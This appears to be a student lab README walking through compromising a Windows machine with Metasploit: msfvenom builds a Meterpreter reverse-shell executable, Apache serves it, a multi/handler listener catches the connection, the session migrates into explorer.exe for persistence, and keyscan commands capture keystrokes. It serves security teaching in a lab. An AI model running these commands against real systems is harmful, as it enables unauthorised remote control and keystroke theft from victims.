# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/0f0a4214-f2dc-4996-8926-eb56392bcc9c)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/7556fc57-da46-4e95-8513-3751c39f7877)



copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/ef0ae3f2-ed72-4581-a5e3-082fc0c1c662)


Start apache server
sudo systemctl apache2 start

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/06567d9d-bf5a-46f3-8915-09e660fd0ee6)



Check the status of apache2
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/6ce0d347-84b4-4782-9e05-3684db0a972a)



Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/039dce90-c240-40e3-a053-479988b6de5a)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/aa0b8678-65a2-4343-860c-047c9a5f377d)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/e52ec7e8-339e-4c61-97d4-6ded61fa3868)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/b01cdebf-4e0f-4184-b6c3-de19d44d03a0)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/8347aaba-4690-4922-8388-33f496f36796)


keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/6e719e14-830f-4589-a9de-86ebbba28b65)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
